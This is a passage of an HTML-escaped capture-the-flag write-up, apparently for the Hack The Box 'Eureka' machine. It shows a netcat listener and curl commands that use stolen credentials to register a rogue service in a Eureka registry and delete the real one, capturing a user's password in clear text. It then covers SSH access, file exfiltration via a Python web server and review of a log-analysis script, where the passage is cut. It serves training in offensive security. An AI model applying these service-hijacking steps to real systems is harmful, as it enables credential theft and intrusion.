&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;lastDirtyTimestamp&amp;gt;&lt;/span>1745833100737&lt;span class="nt">&amp;lt;/lastDirtyTimestamp&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;actionType&amp;gt;&lt;/span>ADDED&lt;span class="nt">&amp;lt;/actionType&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/instance&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="8-register-the-fake-service">8. REGISTER THE FAKE SERVICE:&lt;/h2>
&lt;ol>
&lt;li>Setup the listener:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo rlwrap nc -nlvp &lt;span class="m">8081&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Register your service:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -i -u &lt;span class="err">&amp;#39;&lt;/span>EurekaSrvr:0scarPWDisTheB3st &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/xml&amp;#34;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -d @mitm.xml &lt;span class="se">\ &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -X POST http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428213326-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="9-delete-the-original-service">9. DELETE THE ORIGINAL SERVICE:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -i -u &lt;span class="s1">&amp;#39;EurekaSrvr:0scarPWDisTheB3st&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -X DELETE &lt;span class="se">\ &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428215037-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="-check-the-listener">&amp;gt; Check The Listener:&lt;/h3>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428215508-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We see the the credentials via or MITM attack :&lt;/p>
&lt;p>Username: &lt;strong>miranda.wise&lt;/strong>
Password: &lt;em>IL%21veT0Be%26BeT0L0ve&lt;/em> &amp;gt; &lt;strong>IL!veT0Be&amp;amp;BeT0L0ve&lt;/strong>&lt;/p>
&lt;p>The password has some Url Encoded characters lets decode it via python one liner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s2">&amp;#34;import sys, urllib.parse; print(urllib.parse.unquote(sys.argv[1]))&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;IL%21veT0Be%26BeT0L0ve&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428220431-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="10-ssh-as-miranda-wise--usertxt">10. SSH AS MIRANDA-WISE / USER.TXT:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ssh miranda-wise@furni.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428221032-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="11-post-enumeration">11. POST ENUMERATION:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428231756-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>No sudo abuse.&lt;/p>
&lt;p>Earlier via linpeas we found out that &lt;em>/opt&lt;/em> has interesting files which were:&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428232251-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We couldn&amp;rsquo;t still access the script directory and heapdump neither heapdump.
So lets download the &lt;strong>log_analyse.sh&lt;/strong> file&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#/ON-TARGET/#&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp /opt/log_analyse.sh .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 -m http.server &lt;span class="m">1234&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#/ON-KALI/#&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -O http://10.10.11.66:1234/log_analyse.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets review the code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/bin/bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Colors&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">GREEN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;32m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">RED&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;31m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">YELLOW&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[1;33m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">BLUE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;34m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">CYAN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0;36m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">RESET&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\033&lt;/span>&lt;span class="s1">[0m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">LOG_FILE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">OUTPUT_FILE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;log_analysis.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">declare&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">A&lt;/span> &lt;span class="n">successful_users&lt;/span> &lt;span class="c1"># Associative array: username -&amp;gt; count&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">declare&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">A&lt;/span> &lt;span class="n">failed_users&lt;/span> &lt;span class="c1"># Associative array: username -&amp;gt; count&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">STATUS_CODES&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;200:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;201:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;302:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;400:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;401:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;403:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;404:0&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;500:0&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Indexed array: &amp;#34;code:count&amp;#34; pairs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="err">!&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="s2">Error: Log file $LOG_FILE not found.$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_logins&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Process successful logins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$line&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="sa">F&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="s2">&amp;#34;${successful_users[$username]+_}&amp;#34;&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;LoginSuccessLogger&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Process failed logins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$line&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="sa">F&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="s2">&amp;#34;${failed_users[$username]+_}&amp;#34;&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;LoginFailureLogger&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_http_statuses&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Process HTTP status codes&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$line&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">oP&lt;/span> &lt;span class="s1">&amp;#39;Status: \K.*&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">found&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Check if code exists in STATUS_CODES array&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;${!STATUS_CODES[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">existing_entry&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{STATUS_CODES[$i]}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">existing_code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$existing_entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">existing_count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$existing_entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="s2">&amp;#34;$existing_code&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">eq&lt;/span> &lt;span class="s2">&amp;#34;$code&amp;#34;&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">existing_count&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">STATUS_CODES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{existing_code}&lt;/span>&lt;span class="s2">:$&lt;/span>&lt;span class="si">{new_count}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;HTTP.*Status: &amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_log_errors&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Log Level Counts (colored)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{YELLOW}&lt;/span>&lt;span class="s2">[+] Log Level Counts:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">log_levels&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">oP&lt;/span> &lt;span class="s1">&amp;#39;(?&amp;lt;=Z )\w+&amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$log_levels&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">blue&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$BLUE&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">yellow&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$YELLOW&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">red&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RED&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">reset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RESET&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;INFO&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">blue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;WARN&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">yellow&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;ERROR&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">red&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">reset&lt;/span>&lt;span class="p">;&lt;/span>
